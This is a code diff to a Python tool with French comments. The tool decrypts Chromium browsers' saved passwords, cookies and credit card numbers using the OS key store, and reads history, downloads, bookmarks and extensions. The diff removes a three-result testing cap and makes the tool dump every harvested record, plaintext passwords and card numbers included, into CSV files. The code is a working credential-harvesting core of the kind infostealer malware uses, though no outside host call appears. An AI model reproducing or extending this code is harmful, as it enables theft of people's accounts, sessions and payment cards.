@@ -47,6 +47,7 @@ def get_encryption_key(local_state_path):
         if utils.IS_WINDOWS:
             import win32crypt
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
 
         elif utils.IS_LINUX:
             return subprocess.check_output(
@@ -77,7 +78,7 @@ def decrypt_value(encrypted_password, key):
     try:
         if encrypted_password[:3] != b"v10":
             return "Format inconnu"
-
+        
         iv = encrypted_password[3:15]  # IV de 12 octets
         payload = encrypted_password[15:-16]  # Données chiffrées
         tag = encrypted_password[-16:]  # Tag d'authentification AES-GCM
@@ -101,7 +102,6 @@ def extract_passwords(browser: Browser, profile: Profile = None):
 
     # On boucle sur tous les chemins potentiels
     for login_db in login_dbs:
-        nb_pass = 0
         if not login_db.exists():
             continue
 
@@ -114,35 +114,29 @@ def extract_passwords(browser: Browser, profile: Profile = None):
             cursor = conn.cursor()
             cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
 
-            counter = 0
+            passwords_list = []
             for (
                 origin_url,
                 action_url,
                 username,
                 encrypted_password,
             ) in cursor.fetchall():
-                password = decrypt_value(encrypted_password, browser.encryption_key)
-                if password and password != "Format inconnu":
-                    print(f"[🌍] URL d'origine: {origin_url}")
-                    print(f"[🌍] URL de login: {action_url}")
-                    print(f"[👤] Username: {username}")
-                    print(f"[🔑] Password: {password}\n")
-                    counter += 1
-                    nb_pass += 1
-                    # Uniquement les 3 premiers résultats pour tester
-                    if counter > 2:
-                        break
+                password = decrypt_value(encrypted_password, browser.encryption_key) 
+                passwords_list.append({
+                    "origin_url": origin_url,
+                    "action_url": action_url,
+                    "username": username,
+                    "password": password,
+                })
+                
+            if passwords_list:   
+                utils.write_to_csv(passwords_list, "passwords.csv", browser.name, profile.name)
 
             conn.close()
             os.remove(temp_db)
 
         except Exception as e:
             print(f"❌ Erreur extraction {browser} : {e}")
-
-    if nb_pass:
-        print(f"🔑 {nb_pass} mot(s) de passe trouvé(s)\n")
-    else:
-        print("❌ Aucun mot de passe trouvé\n")
 
 # Fonction pour extraire l'historique de navigation
 def extract_history(browser, profile: Profile = None):
@@ -204,17 +198,17 @@ def extract_download_history(browser, profile: Profile = None):
             "SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads"
         )
 
-        counter = 0
+        download_history_list = []
         for target_path, tab_url, total_bytes, start_time, end_time, mime_type in cursor.fetchall():
-            print(f"[📂] Fichier: {target_path}")
-            print(f"[🌍] URL: {tab_url}")
-            print(f"[📦] Taille: {total_bytes} octets")
-            print(f"[🕒] Début: {start_time}")
-            print(f"[🕒] Fin: {end_time}")
-            print(f"[🔖] Type MIME: {mime_type}\n")
-            counter += 1
-            if counter > 2:
-                break
+            download_history_list.append({
+                "target_path": target_path,
+                "tab_url": tab_url,
+                "total_bytes": total_bytes,
+                "start_time": start_time,
+                "end_time": end_time,
+                "mime_type": mime_type
+            })
+        utils.write_to_csv(download_history_list, "download_history.csv", browser.name, profile.name)
 
         conn.close()
         os.remove(temp_db)
@@ -250,21 +244,22 @@ def extract_cookies(browser, profile: Profile = None):
             "SELECT name, cast(encrypted_value AS BLOB), host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies"
         )
 
-        counter = 0
+        cookies_list = []
         for name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent in cursor.fetchall():
             if encrypted_value[:3] == b"v10":
-                decrypted_value = decrypt_value(encrypted_value, browser.encryption_key)
-                print(f"[🍪] Nom: {name}")
-                print(f"[🔑] Valeur: {decrypted_value}")
-                print(f"[🌍] Domaine: {host_key}")
-                print(f"[📂] Chemin: {path}")
-                print(f"[🕒] Création: {creation_utc}")
-                print(f"[🕒] Expiration: {expires_utc}")
-                print(f"[🔒] Sécurisé: {is_secure}")
-                print(f"[🔒] HttpOnly: {is_httponly}\n")
-                counter += 1
-                if counter > 2:
-                    break
+                cookies_list.append({
+                    "name": name,
+                    "encrypted_value": encrypted_value,
+                    "host_key": host_key,
+                    "path": path,
+                    "creation_utc": creation_utc,
+                    "expires_utc": expires_utc,
+                    "is_secure": is_secure,
+                    "is_httponly": is_httponly,
+                    "has_expires": has_expires,
+                    "is_persistent": is_persistent
+                })
+                
         conn.close()
         os.remove(temp_db)
 
@@ -289,9 +284,19 @@ def extract_bookmarks(browser, profile: Profile = None):
 
     try:
         with open(temp_db, "r", encoding="utf-8") as file:
-            bookmarks = json.load(file)
-                
-            print(bookmarks)
+            bookmarks_data = json.load(file)
+            bookmarks = {"roots": bookmarks_data.get("roots", {}), "version": bookmarks_data.get("version", "")}
+            bookmarks_list = []
+            for key, value in bookmarks["roots"].items():
+                if key == "bookmark_bar":
+                    for bookmark in value["children"]:
+                        bookmarks_list.append({
+                            "name": bookmark.get("name", ""),
+                            "url": bookmark.get("url", ""),
+                            "date_added": bookmark.get("date_added", ""),
+                            "type": bookmark.get("type", "")
+                        })
+            utils.write_to_csv(bookmarks_list, "bookmarks.csv", browser.name, profile.name)
 
         os.remove(temp_db)
 
@@ -325,6 +330,7 @@ def extract_extensions(browser, profile: Profile = None):
                             with open(manifest_file, "r", encoding="utf-8") as file:
                                 manifest_content = json.load(file)
                                 extensions.append(parse_chromium_extension(manifest_content, id))
+        utils.write_to_csv(extensions, "extensions.csv", browser.name, profile.name)
     except Exception as e:
         print(f"❌ Erreur extraction : {e}")
     finally:
@@ -341,6 +347,8 @@ def parse_chromium_extension(manifest_content, id) -> dict:
                 extension_data[key] = get_chromium_ext_url(id, manifest_content[key])
             else:
                 extension_data[key] = manifest_content[key]
+        else:
+            extension_data[key] = ""
                 
     extension_data["id"] = id
     extension_data["enabled"] = manifest_content.get("disable_reasons", True)
@@ -380,16 +388,18 @@ def extract_credit_cards(browser, profile: Profile = None):
             "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
         )
 
-        counter = 0
+        credit_card_list = []
         for name_on_card, expiration_month, expiration_year, encrypted_card_number in cursor.fetchall():
             card_number = decrypt_value(encrypted_card_number, browser.encryption_key)
-            print(f"[💳] Nom sur la carte: {name_on_card}")
-            print(f"[📅] Mois d'expiration: {expiration_month}")
-            print(f"[📅] Année d'expiration: {expiration_year}")
-            print(f"[🔑] Numéro de carte: {card_number}\n")
-            counter += 1
-            if counter > 2:
-                break
+            credit_card_list.append({
+                "name_on_card": name_on_card,
+                "expiration_month": expiration_month,
+                "expiration_year": expiration_year,
+                "card_number": card_number
+            })
+            
+        utils.write_to_csv(credit_card_list, "credit_cards.csv", browser.name, profile.name)
+
 
         conn.close()
         os.remove(temp_db)
@@ -458,9 +468,9 @@ def extract_data():
 
         if not browser.profiles:
             print(f"🔍 Extraction des données pour le profil par défaut")
-            for key, opt in OPTIONS.items():
+            for k, opt in OPTIONS.items():
                 if opt["active"]:
-                    func_name = f"extract_{key}"
+                    func_name = f"extract_{k}"
                     func = globals().get(func_name)
                     if callable(func):
                         func(browser)
@@ -470,9 +480,9 @@ def extract_data():
         else:
             for profile in browser.profiles:
                 print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
-                for key, opt in OPTIONS.items():
+                for k, opt in OPTIONS.items():
                     if opt["active"]:
-                        func_name = f"extract_{key}"
+                        func_name = f"extract_{k}"
                         func = globals().get(func_name)
                         if callable(func):
                             func(browser, profile)
